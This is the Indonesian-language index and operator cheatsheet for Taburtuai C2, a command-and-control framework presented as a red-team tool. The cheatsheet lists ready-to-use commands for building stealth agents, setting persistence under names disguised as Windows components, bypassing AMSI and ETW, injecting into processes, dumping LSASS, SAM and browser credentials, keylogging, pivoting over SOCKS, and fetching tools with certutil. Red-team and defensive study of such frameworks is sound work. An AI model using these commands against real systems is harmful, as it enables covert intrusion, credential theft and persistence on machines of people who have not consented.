# Taburtuai C2 — Dokumentasi Lengkap

> **PERINGATAN:** Framework ini hanya boleh digunakan untuk **authorized security testing**,
> red team engagement dengan izin tertulis, dan penelitian keamanan defensif.
> Penggunaan tanpa izin adalah tindakan ilegal.

---

## Daftar Isi

| # | Halaman | Topik Utama |
|---|---------|-------------|
| [01](01-introduction.md) | Introduction | Arsitektur, komponen, model threat, flow komunikasi |
| [02](02-setup.md) | Setup & Instalasi | Prerequisites, build, konfigurasi server, HTTPS |
| [03](03-quickstart.md) | Quickstart | Dari nol ke agent aktif, 10 langkah end-to-end |
| [04](04-agents.md) | Agent Management | List, inspect, delete, filter, beacon interval |
| [05](05-execution.md) | Command Execution | Shell, interactive, working dir, timeout, methods |
| [06](06-files.md) | File Operations | Upload, download, list, delete, ADS write |
| [07](07-persistence.md) | Persistence | Registry, scheduled task, service, startup folder |
| [08](08-process.md) | Process Management | List, kill, start, PPID spoofing |
| [09](09-stager.md) | Stager & Delivery | Stage upload, token, format stager, delivery methods |
| [10](10-injection.md) | Process Injection | CRT, APC, hollowing, hijack, stomp, mapinject |
| [11](11-evasion.md) | Evasion & Bypass | AMSI, ETW, unhook, sleep masking, HWBP, token |
| [12](12-credentials.md) | Credential Access | LSASS, SAM, browser, clipboard |
| [13](13-recon.md) | Reconnaissance | Screenshot, keylogger, token enumeration |
| [14](14-network.md) | Network & Pivoting | Port scan, ARP scan, SOCKS5 proxy |
| [15](15-advanced.md) | Advanced Techniques | BOF, registry ops, OPSEC timegate, anti-analysis |
| [16](16-scenarios.md) | Red Team Scenarios | Skenario engagement end-to-end |
| [17](17-profiles.md) | Malleable Profiles | HTTP traffic camouflage (office365, cdn, slack) |
| [18](18-opsec-hardening.md) | OPSEC Hardening | String encryption, Authenticode signing |
| [19](19-advanced-transports.md) | Advanced Transports | DoH beacon, ICMP C2, SMB named pipe |
| [20](20-teamserver.md) | Team Server | Multi-operator, claiming, SSE event stream |

---

## Cheatsheet Operator

```bash
# ─── SERVER ─────────────────────────────────────────────────────────────────
ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8000

# ─── BUILD AGENT ────────────────────────────────────────────────────────────
make agent-win-stealth C2_SERVER=https://c2.corp.local:8000 ENC_KEY=K3yRah4sia INTERVAL=60 JITTER=25
make agent-win-doh     C2_SERVER=example.com ENC_KEY=K3yRah4sia TRANSPORT=doh
make agent-win-smb     SMB_RELAY=10.10.5.3   ENC_KEY=K3yRah4sia TRANSPORT=smb

# ─── OPERATOR CONSOLE ───────────────────────────────────────────────────────
./bin/operator console --server http://IP:8000

# ─── AGENT MANAGEMENT ───────────────────────────────────────────────────────
agents list
agents list --status online
agents info <id>
agents delete <id>

# ─── COMMAND EXECUTION ──────────────────────────────────────────────────────
cmd    <id> "whoami /priv"
shell  <id>                        # interactive shell
cmd    <id> "powershell Get-Process" --method powershell --timeout 60 --wait

# ─── FILE OPS ───────────────────────────────────────────────────────────────
files upload   <id> /local/tool.exe "C:\Temp\tool.exe"
files download <id> "C:\Users\user\Documents\loot.xlsx" ./loot.xlsx
files list     <id> "C:\Users\user\Desktop"
files delete   <id> "C:\Temp\tool.exe"

# ─── PERSISTENCE ────────────────────────────────────────────────────────────
persistence setup  <id> --method registry_run   --name "WindowsUpdate"
persistence setup  <id> --method schtask        --name "SyncTask" --trigger logon
persistence setup  <id> --method service        --name "WinDefSvc"
persistence setup  <id> --method startup_folder --name "Updater"
persistence list   <id>
persistence remove <id> --method registry_run --name "WindowsUpdate"

# ─── PROCESS ────────────────────────────────────────────────────────────────
process list  <id>
process kill  <id> --pid 4512
process start <id> --path "C:\Windows\System32\cmd.exe" --args "/c whoami" --hidden

# ─── EVASION ────────────────────────────────────────────────────────────────
bypass amsi   <id> [--pid <pid>]
bypass etw    <id> [--pid <pid>]
evasion unhook   <id>
evasion sleep    <id> --duration 30
evasion hwbp set <id> --addr 0x7FFE1234 --register 0

# ─── TOKEN ──────────────────────────────────────────────────────────────────
token list   <id>
token steal  <id> --pid 724
token make   <id> --user john --domain CORP --pass "P@ss"
token runas  <id> --pid 724 --exe "cmd.exe" --args "/c whoami"
token revert <id>

# ─── INJECTION ──────────────────────────────────────────────────────────────
inject remote <id> --pid 3048 --file payload.bin --method crt
inject remote <id> --pid 3048 --file payload.bin --method apc
inject self   <id> --file payload.bin
inject ppid   <id> --exe "cmd.exe" --ppid-name explorer.exe
hollow        <id> --file payload.bin [--exe svchost.exe]
hijack        <id> --pid 3048 --file payload.bin
stomp         <id> --file payload.bin --dll xpsservices.dll
mapinject     <id> --file payload.bin [--pid 3048]

# ─── CREDENTIALS ────────────────────────────────────────────────────────────
creds lsass    <id> [--output C:\Temp\lsass.dmp]
creds sam      <id> [--output-dir C:\Temp]
creds browser  <id>
creds clipboard <id>

# ─── RECON ──────────────────────────────────────────────────────────────────
screenshot <id>
keylog start <id> [--duration 60]
keylog dump  <id>
keylog stop  <id>
keylog clear <id>

# ─── NETWORK & PIVOT ────────────────────────────────────────────────────────
netscan  <id> --targets 192.168.1.0/24 --ports 22,80,443,3389
arpscan  <id>
socks5 start <id> [--addr 127.0.0.1:1080]
socks5 stop  <id>

# ─── REGISTRY ───────────────────────────────────────────────────────────────
registry read   <id> --hive HKLM --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName
registry write  <id> --hive HKCU --key "Software\Test" --value MyVal --data hello --type sz
registry delete <id> --hive HKCU --key "Software\Test" --value MyVal
registry list   <id> --hive HKLM --key "SOFTWARE\Microsoft"

# ─── ADVANCED ───────────────────────────────────────────────────────────────
bof      <id> --file dir.o [--args-b64 <packed>]
opsec antidebug <id>
opsec antivm    <id>
opsec timegate  <id> --work-start 8 --work-end 18 --kill-date 2026-12-31
lolbin fetch    <id> --url http://10.10.5.3/tool.exe --dest "C:\Temp\t.exe" --method certutil
ads exec        <id> --ads-path "C:\legit.txt:payload.js"

# ─── TEAM SERVER ────────────────────────────────────────────────────────────
team operators
team subscribe --name "Alice" --server http://IP:8000   # SSE stream
team claim   <id> --session S --server http://IP:8000
team release <id> --session S --server http://IP:8000
```

---

## Konvensi Dokumen

| Token | Arti |
|-------|------|
| `<id>` | Agent ID lengkap atau prefix 8 karakter |
| `<cmd-id>` | Command ID dari output antrean |
| `KEY` | Nilai `ENCRYPTION_KEY` yang identik di server dan agent |
| `IP:PORT` | Alamat C2 server yang dapat diakses dari internet |
| `--wait` | Tunggu hasil sebelum lanjut (opsional, blocking) |
| `[...]` | Parameter opsional |

---

*Taburtuai C2 — For authorized security testing only.*
